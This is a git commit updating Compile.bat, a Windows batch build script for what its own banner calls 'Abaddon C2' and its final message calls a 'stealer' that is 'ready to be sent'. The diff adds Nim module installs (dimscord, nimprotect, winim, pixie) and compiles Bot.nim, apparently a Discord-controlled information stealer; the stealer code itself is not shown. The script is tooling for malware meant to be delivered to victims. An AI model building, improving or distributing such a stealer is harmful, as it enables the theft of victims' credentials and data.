41aa1e7c1dfa21e655f7747912e74c5b0fc8a61f
PeroXide <103697143+Peroxidelol@users.noreply.github.com>
2023-10-24 02:55:31 -0700

    Update Compile.bat

--- Compile.bat
+++ Compile.bat
@@ -2,17 +2,28 @@
 cls
 
 echo.
+echo    _____ ___.               .___  .___             \u001b[35m _________  ________  \u001b[0m
+echo   /  _  \\_ |__ _____     __| _/__| _/____   ____  \u001b[35m \_   ___ \ \_____  \ \u001b[0m
+echo  /  /_\  \| __ \\__  \   / __ |/ __ |/  _ \ /    \ \u001b[35m /    \  \/  /  ____/ \u001b[0m
+echo /    |    \ \_\ \/ __ \_/ /_/ / /_/ (  <_> )   |  \\u001b[35m \     \____/       \ \u001b[0m
+echo \____|__  /___  (____  /\____ \____ |\____/|___|  /\u001b[35m  \______  /\_______ \\u001b[0m
+echo         \/    \/     \/      \/    \/           \/ \u001b[35m         \/         \/\u001b[0m
+
 echo [92mInstalling nim modules...[0m
-timeout /t 5
 nimble install dimscord
+nimble install nimprotect
+nimble install winim
+nimble install pixie
+timeout 2 > nul
 
 echo.
 echo [92mCompiling source...[0m
-timeout /t 5
 nim c .\Bot.nim
+timeout 2 > nul
 
 echo.
 echo.
 echo [92mCompiled successfully![0m Your stealer is now ready to be sent. 
 echo.
-echo.
+timeout 5 > nul
+
